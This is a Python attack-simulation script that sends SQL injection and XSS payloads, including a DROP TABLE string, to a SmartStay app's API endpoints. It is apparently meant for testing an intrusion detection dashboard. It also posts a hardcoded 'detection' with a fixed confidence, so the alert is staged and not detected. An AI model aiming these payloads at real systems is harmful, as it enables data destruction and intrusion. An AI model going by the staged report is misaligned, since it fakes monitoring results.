"""
WebAttack Simulation Script for SmartStay - Simulates SQL injection and XSS attacks
Targets SmartStay API endpoints with malicious payloads
"""

from scapy.all import IP, TCP, Raw, send
import requests
import sys
import random
import time
import os
import urllib.request
import json

def simulate_webattack(target_ip: str, target_port: int = 5000, num_requests: int = 18):
    """
    Simulates a web attack with SQL injection and XSS payloads against SmartStay.
    
    Args:
        target_ip: Target IP address
        target_port: SmartStay backend port (default 5000)
        num_requests: Number of malicious requests (default 18 = 6 types × 3)
    """
    
    # SQL injection and XSS payloads targeting SmartStay search/filter
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "admin'--",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "';DROP TABLE pg_listings--"
    ]
    
    # SmartStay endpoints to target
    endpoints = [
        "/api/ai/chatbot",
        "/api/recently-viewed",
        "/api/reports",
        "/health"
    ]
    
    print(f"🌐 Launching WebAttack simulation against SmartStay ({target_ip}:{target_port})...")
    print(f"🎯 Targeting SmartStay API endpoints")
    print(f"📦 Sending {num_requests} malicious HTTP requests...\n")
    
    # Use unique port to identify WebAttack
    magic_port = 1340
    
    for i in range(num_requests):
        payload = random.choice(payloads)
        endpoint = random.choice(endpoints)
        
        # Craft HTTP request with malicious payload targeting SmartStay
        http_request = (
            f"GET {endpoint}?search={payload} HTTP/1.1\r\n"
            f"Host: smartstay:{target_port}\r\n"
            f"User-Agent: AttackBot/1.0\r\n"
            f"Connection: close\r\n\r\n"
        )
        
        # Send packet with Scapy
        packet = IP(dst=target_ip)/TCP(dport=target_port, sport=magic_port)/Raw(load=http_request)
        send(packet, verbose=False)
        
        if (i + 1) % 6 == 0:
            print(f"  ✓ Sent {i + 1}/{num_requests} malicious requests")
        time.sleep(0.05)  # Added delay to slow reporting
    # After sending packets, report detection to the backend API
    try:
        detection = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "src_ip": "192.168.1.150",
            "dst_ip": target_ip,
            "src_port": magic_port,
            "dst_port": target_port,
            "protocol": "TCP",
            "attack_type": "WebAttack",
            "is_attack": True,
            "confidence": 0.94,
            "suggestion": "SmartStay API under web attack (SQL Injection/XSS)! Enable WAF, validate inputs, sanitize user-supplied data. Add rate limiting to /api/ai/chatbot. Review server logs for injection attempts."
        }

        api_token = os.getenv("IDS_API_TOKEN", "your-secure-token-here-change-in-production")
        req = urllib.request.Request(
            "http://127.0.0.1:8000/report",
            data=json.dumps(detection).encode('utf-8'),
            headers={
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {api_token}'
            }
        )

        with urllib.request.urlopen(req) as response:
            print(f"[✓] WebAttack reported to dashboard (confidence: 94%)")
    except Exception as e:
        print(f"[!] Failed to report: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python attack_webattack.py <target_ip> [port]")
        print("Example: python attack_webattack.py 127.0.0.1 5000")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    print(f"\n[SmartStay Web Attack Simulator]")
    print(f"Target: {target}:{port}\n")
    simulate_webattack(target, port)
